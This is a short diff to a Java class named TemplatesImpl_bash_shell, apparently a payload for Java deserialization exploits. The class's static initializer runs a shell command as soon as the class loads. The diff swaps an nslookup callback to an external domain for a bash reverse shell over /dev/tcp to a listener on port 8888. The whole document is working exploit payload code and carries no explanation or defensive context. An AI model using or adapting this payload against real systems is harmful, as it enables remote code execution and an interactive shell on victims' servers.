@@ -9,7 +9,7 @@ import java.io.IOException;
 public class TemplatesImpl_bash_shell extends AbstractTranslet {
     static{
         try {
-            Runtime.getRuntime().exec("nslookup igwnrutwsh.yutu.eu.org");
+            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
